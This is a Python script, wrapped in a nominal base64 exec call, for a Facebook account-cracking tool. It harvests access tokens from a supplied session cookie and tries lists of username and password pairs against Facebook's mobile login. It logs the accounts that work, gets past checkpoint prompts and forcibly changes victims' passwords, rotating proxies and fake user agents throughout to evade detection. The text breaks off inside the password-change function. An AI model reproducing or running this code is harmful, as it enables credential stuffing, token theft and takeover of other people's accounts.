import base64
exec(base64.b64decode("# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-07-11 09:11:37.686645

import os
try:
	import rich
except ImportError:
	print('\n\t [!] INSTALLING THE RICH MODULE\n')
	os.system('pip install rich')
try:
    import requests
except ImportError:
    print("\n\t [!] INSTALLING MODULE REQUESTS\n")
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print("\n\t [!] INSTALLING THE FUTURES MODULE\n")
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print("\n\t [!] INSTALLING THE FUTURES MODULE BS4\n")
    os.system('pip install bs4')
    os.system('git pull')
import os, requests, re, bs4, sys, json, time, random, datetime, subprocess, rich
from concurrent.futures import ThreadPoolExecutor as AangXD
from datetime import datetime
from bs4 import BeautifulSoup
from rich.markdown import Markdown
from rich.console import Console
from rich import print as prints
from rich.panel import Panel
from rich import print as rprint
from rich import pretty
from rich.progress import track
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.progress import track
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
pepeck = '\x1b[0;32m' # HIJAU GELAP
asyu = '\x1b[0;33m' # KUNING GELAP
HI = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
b = "[#00C8FF]" # Biru
u = "[#AF00FF]" # Ungu
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
sys.stdout.write('\x1b[1;35m\x1b]2; DRACULA \x07');sys.stdout.write('\x1b[1;37mALREADY UP TO DATE.\n')
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_tizen = "Mozilla/5.0 (Linux; Tizen 2.3; SmartHub; SMART-TV; SmartTV; U; Maple2012) AppleWebKit/538.1+ (KHTML, like Gecko) TV Safari/538.1+"
uas_symbian ="Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 Nokia5800d-1/21.0.025; Profile/ MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
uas_galaxy = "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"
uas_xmi = "Mozilla/5.0 (Linux; Android 9; Pro_P300_4G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/295.0.0.36.119;]"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_lg = "Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405"
uas_lg2 = "Mozilla/5.0 (Linux; Android 6.0; LG-H815 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36"
uas_lg3 = "Mozilla/5.0 (Linux; Android 9; LGL722DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36"
uas_mac = "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
uas_ubs = "Mozilla/5.0 (Linux; U; Android 9; zh-CN; PCT-AL10 Build/HUAWEIPCT-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.2.5.1005 Mobile Safari/537.36"
uas_mox = "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1"
uas_x27 = "Mozilla/5.0 (Linux; U; Android 4.4.2; pt-BR; X27 plus Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36"
uas_mi = "Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 Reddit/Version 2021.38.0/Build 365032/Android 11"
uas_phn = "Mozilla/5.0 (Linux; U; Android 10; it-it; Mi 10T Pro Build/QKQ1.200419.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.6.6-gn"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
ugen2=[]
ugen=[]

try:
    #prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    prox= requests.get('https://proxylist.geonode.com/api/proxy-list?limit=5000&page=1&sort_by=lastChecked&sort_type=desc&speed=fast&protocols=socks5').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
	PT = dt["isp"]
except KeyError:
	IP = " "
	CN = " "
	PT = " "
def ngehe():
    os.system('clear')
    Aang = 'ALWAYS SAY ALHAMDULILLAH .\nUSE THE TOOLS WISELY, BECAUSE I AM NOT RESPONSIBLE FOR ANY THINGS THAT ARE OUTSIDE. THANK YOU AND WELCOME TO USING THIS SCRIPT, MAY ALLAH ​​BLESS YOU'
    Kiya = nel(Aang, style='red');cetak(nel(Kiya, title='> INFORMATION <'))
    __ukhty__ = input("  %s[%s!%s] PRESS ENTER TO RUN TOOLS "%(P,M,P))
    os.system("clear")
    prints(Panel(f"[{J2}+{P2}] THIS TOOL USES FACEBOOK COOKIES LOGIN \n[{J2}+{P2}] TYPE [{H2}OPEN{P2}] TO SEE HOW TO RETRIEVE COOKIES"))
    cookie = input("\n  %s[%s?%s] ENTER COOKIES : %s"%(P,H,P,pepeck))
    if cookie in['BUKA','Buka','buka']:
      jalan("\n\n %s[%s!%s] You will be redirected to %sFacebook%s"%(P,H,P,H,P));time.sleep(3);os.system('xdg-open https://www.facebook.com/profile.php?id=100022553810709');ngehe()
    try:
        head={
            'Host':'business.facebook.com',
            'cache-control':'max-age=0','upgrade-insecure-requests':'1',
            'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
            'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8',
            'accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': cookie
        }
        asww=requests.get("https://business.facebook.com/creatorstudio/home", headers=head)
        reqq=re.search('{"accessToken":"(EAA\w+)', asww.text)
        tokn=reqq.group(1)
        open('.cokie.txt', 'a').write(cookie);open('.token.txt', 'a').write(tokn)
        __pepek__ = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokn)).json()['name']
        jalan('\n\n%s   * -->%s WELCOME %s%s%s'%(H,P,H,__pepek__,P));time.sleep(2)
        jalan('%s   * --> %s HAPPY USING  ...\n'%(H,P));time.sleep(2)
        input('%s   * --> %sPRESS ENTER TO ENTER '%(H,P));os.system("xdg-open https://www.facebook.com/theorygg1");kiya()
    except AttributeError:
        print('\n  %s[%s!%s] SORRY, INVALID COOKIES'%(N,H,N));time.sleep(1);ngehe()
    except UnboundLocalError:
        print('\n  %s[%s!%s] SORRY, INVALID COOKIES'%(N,H,N));time.sleep(1);ngehe()
    except requests.exceptions.ConnectionError:
        exit('\n\n  %s[%s!%s] NO INTERNET CONNECTION\n'%(N,H,N))
def logo():
	os.system("clear")
	prints(Panel(f"""{H2}   NAMAJ ALWAYS BEST 😍 \n {P2}• MULTI BRUTE FORCE{H2} \n FATHER GG   X  DRACULA  {P2}• FACEBOOK TOOLS{H2}\n DRACULA  {P2}\n"""))
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print("\n");prints(Panel(f"[{H2}✓{P2}] THE CRACK PROCESS HAS BEEN COMPLETED ...\n[{J2}+{P2}] TOTAL ACCOUNT OK : {H2}{str(len(ok))}{P2}\n[{J2}+{P2}] TOTAL ACCOUNT CP : {K2}{str(len(cp))}{P2}"))
        __sempak__ = input(f"  [{O}?{N}] WANT TO DIRECTLY CHECK THE ACCOUNT OPTIONS? (Y/T): ")
        if __sempak__ =="":
            print(f"\n  [{M}!{N}] CAN'T IT BE EMPTY?");hasil(ok,cp)
        elif __sempak__ in["Y","y"]:
            prints(Panel(f"[{M2}!{P2}] AIRPLANE MODE FIRST 3 SECONDS BEFORE START"));time.sleep(2)
            ww=input(f"  [{H}?{N}] CHANGE PASSWORD WHEN TAP CROT? (Y/T): ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                prints(Panel(f"[{H2}•{P2}] PASSWORD EXAMPLE : {H2}Ahmado Podari{P2}"))
                pwBar=input(f"  [{H}!{P}] ENTER NEW PASSWORD : ")
                if len(pwBar) <= 5:
                    prints(Panel(f"[{M2}!{P2}] MINIMUM PASSWORD {H2}6 CHARACTER {P2}KENTOD"))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                prints(Panel(f'[{K2}+{P2}] CHECK LOGIN : {K2}{kontol.replace(" [×] ", "")}{P2}'))
                try:
                    log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
            prints(Panel(f"\t     {H2}> THE CHECKING PROCESS IS COMPLETE <{P2}"))
            input(f'  [{M}!{P}] PRESS ENTER TO RETURN ');kiya()
        elif __sempak__ in["T","t"]:
        	prints(Panel(f"[{H2}!{P2}] THANK YOU FOR USING THIS TOOL, HAVE A GOOD  DAY :v"));time.sleep(2);exit
        else:
            prints(Panel(f"[{M2}!{P2}] INPUT (Y/T) NGENTOD..."));hasil(ok,cp)
    else:
        prints(Panel(f"[{M2}!{P2}] WOW, YOU DON'T GET RESULTS :v"));time.sleep(2);exit()
def kiya():
    logo()
    try:
        kontol = open('.token.txt', 'r').read()
    except IOError:
        print('\n  %s[%s!%s] SORRY, YOUR COOKIES ARE INVALID'%(P,M,P));time.sleep(2)
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');ngehe()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] NO CONNECTION\n'%(P,M,P))
    IP = requests.get('https://api.ipify.org').text
    _mmk_ = open('.cokie.txt').read()
    kueh  = {"cookie":_mmk_}
    prints(Panel(f"[{H2}•{P2}] IP ADDRESS  : {H2}{IP}{P2}\n[{H2}•{P2}] INTERNET NETWORK : {H2}{PT}{P2}\n[{H2}•{P2}] YOUR COUNTRY : {H2}{CN}{P2}\n[{H2}•{P2}] VERSION TOOLS : {H2}2.8.4{P2}"))
    prints(Panel(f"[{J2}01{P2}]. CRACK ID FROM FILE\n[{J2}02{P2}]. CREATE DUMP FILE\n[{J2}03{P2}]. HOW TO CREATE A DUMP\n[{J2}04{P2}]. FILE CHECK RESULTS CRACK\n[{J2}05{P2}]. CHECK THE CHECKPOINT ACCOUNT OPTION\n[{J2}06{P2}]. CHECK TOOLS INFORMATION \n[{J2}00{P2}]. EXIT SCRIPT"))
    __memek__ = input(f"  [{H}•{P}] INPUT : ")
    if __memek__ in [""]:
        print(f"  [{M}!{P}] CORRECT INPUT")
        exit()
    elif __memek__ in ["1", "01"]:
        __chigoue__()
    elif __memek__ in ["2", "02"]:
    	__dump__()
    elif __memek__ in ["3", "03"]:
    	jalan("\n\n  %s[%s!%s] YOU WILL BE REDIRECTED TO WHAT'S APP"%(P,M,P))
    	os.system("xdg-open https://www.facebook.com/theorygg1");kiya()
    elif __memek__ in ["4", "04"]:
    	dirs = os.listdir("results")
    	prints(Panel(f"\t  > {H2}CRACK RESULTS STORED IN YOUR FILES{P2} <"))
    	for file in dirs:
    	    print(f"  [{H}•{P}] {file}");time.sleep(0.05)
    	file = input("\n  [%s?%s] ENTER FILE NAME : "%(M,P))
    	if file =="":
    	    file = input("\n  [%s?%s] ENTER FILE NAME : "%(M,P))
    	total = open("results/%s"%(file)).read().splitlines()
    	nm_file = ("%s"%(file)).replace("-", " ")
    	hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
    	prints(Panel(f"     {H2}> {P2}RESULT {H2}CRACK{P2} ON DATE : {H2}{hps_nm}{P2} TOTAL : {H2}{len(total)} <{P2}"))
    	for memek in total:
    	    kontol = memek.replace("\n","")
    	    titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
    	    print("  %s%s%s"%(H,titid,P));time.sleep(0.05)
    	prints(Panel(f"\t     {H2}> THE CHECKING PROCESS IS COMPLETE <{P2}"))
    	input(f"  [{H}!{P}] PRESS ENTER TO RETURN ");kiya()
    elif __memek__ in ["5", "05"]:
    	__Cek__Opsi__()
    elif __memek__ in ["6", "06"]:
    	prints(Panel(f"[{H2}•{P2}] DEVELOPER TOOLS\n ╰──────> {H2}FATHER{P2}\n ╰──────> {H2}FATHERCODE TOGETHER {P2}\n\n[{H2}•{P2}] SOCIAL MEDIA\n ╰──────> {H2}FB : FATHER X DRACULA{P2}\n ╰──────> {H2}WHATSAPP :+8801982386362_{P2}\n ╰──────> {H2}GH : FATHER-GG\n\n{P2}[{H2}•{P2}] MESSAGE\n > {H2}DONT EXPECT TOO MACH FROM WOMEN\n{P2} >{H2} BECAUSE IT CAN CAUSE HURT\n\n{P2}[{H2 }•{P2}] CARD SUGGESTION\n > {H2}TSELKOMEL{P2}\n > {H2}AXIS{P2}\n > {H2}XL{P2}\n >{H2}PAKSTAR{P2}"))
    	input(f"  [{H}!{P}] PRESS ENTER TO RETURN ");kiya()
    elif __memek__ in ["0", "00"]:
        ngecrot()
def __dump__():
	try:
		kontol = open('.token.txt','r').read()
	except IOError:
		exit()
	prints(Panel(f"[{M2}!{P2}] SORRY, THIS MENU IS CURRENTLY UNDER DEVELOPMENT"))
	input(f"  [{H}•{P}] PRESS ENTER TO RETURN");kiya()
def ngecrot():
	prints(Panel(f"[{M2}!{P2}] WAIT, I'M DELETING YOUR LOGIN INFO ..."));time.sleep(3)
	os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
	jalan(f"  [{H}✓{P}] SUCCESSFULLY DELETED LOGIN INFO ...");exit()
def __Cek__Opsi__():
    dirs = os.listdir("results")
    prints(Panel(f"\t  > {H2}CRACK RESULTS STORED IN YOUR FILES{P2} <"))
    for file in dirs:
        print("  [%s•%s] %s"%(O,N,file))
    prints(Panel(f"\t {H2}> AIRCRAFT MODE FIRST 3 SECONDS BEFORE START <"));time.sleep(2)
    files = input(f"  [{H}!{N}] ENTER FILE NAME :{H} ")
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        prints(Panel(f"{P2}[{M2}!{P2}] The file doesn't have a password"));time.sleep(2);kiya()
    ww=input(f"  {N}[{M}?{N}] CHANGE PASSWORD WHEN TAP CROT? (Y/T): ")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        prints(Panel(f"[{H2}•{P2}] EXAMPLE PASSWORD: {H2}Moch Aang{P2}"))
        pwBar=input(f"  [{H}?{N}] ENTER NEW PASSWORD : ")
        if len(pwBar) <= 5:
             prints(Panel(f"[{M2}!{P2}] MINIMUM PASSWORD {H2}6 CHARACTERS {P2} KENTOD"))
        else:
            pwBaru.append(pwBar)
    prints(Panel(f"[{H2}•{P2}] TOTAL IS{H2} {str(len(buka_baju))} {P2}akun"))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        prints(Panel(f'[{K2}+{P2}] CHECK LOGIN : {K2}{kontol.replace(" [×] ", "")}{P2}'))
        try:
            log_hasil(titid[0].replace(" [×] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
    prints(Panel(f"\t     {H2}> THE CHECKING PROCESS IS COMPLETE <{P2}"))
    input('  %s[%s!%s] PRESS ENTER TO RETURN '%(P,M,P));os.system(f"rm -rf {buka_baju}");kiya()
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 12; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_EN;FBAV/239.0.0.10.109;]"})
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Turn on airplane mode 2 seconds         '%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r  {N}[{M}!{N}] ACCOUNT LOCKED BY MARK NEGATOD !!")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKEH.txt', 'a').write(f" [✓] {user}|{pasw}\n")
            print(f"\r   {P}[{H}✓{P}] ACCOUNT TAP CROTT YA TOD{N}");jalan(f"\r  {P}[{H}✓{P}] WAIT, CHECKING THE APPLICATION ...{P}");time.sleep(0.05)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r   {P}[{H}✓{P}] ACCOUNT TAP CROTT YA TOD{N}");jalan(f"\r  {P}[{H}✓{P}] WAIT, CHECKING THE APPLICATION ...{P}");time.sleep(0.05)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "AangGanteng:v"
                    print(f"\r   {P}[{H}✓{P}] ACCOUNT TAP CROTT YA TOD{N}");jalan(f"\r  {P}[{H}✓{P}] WAIT, CHECKING THE APPLICATION ...{P}");time.sleep(0.05)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Enter the Login Code to Continue" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print('  %s[%s!%s] TWO-FACTOR AUTHENTICATION INSTALLED ACCOUNT'%(P,M,P))
            else:
                open('results/ERROR.txt', 'a').write(f" [×] {user}|{pasw}\n")
                print(f"  {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DICHEK-{ha}-{op}-{ta}.txt', 'a').write(f" [×] {user}|{pasw}\n")
            jalan("  %s[%s!%s] FOUND %s%s%s OPTION "%(P,M,P,H,len(cek),P))
        for opt in range(len(cek)):
            print(f"  [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r  {P}[{M}!{N}] PASSWORD IS WRONG OR HAS BEEN CHANGED ...")
        open('results/INVALID.txt', 'a').write(f" [×] {user}|{pasw}\n")
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
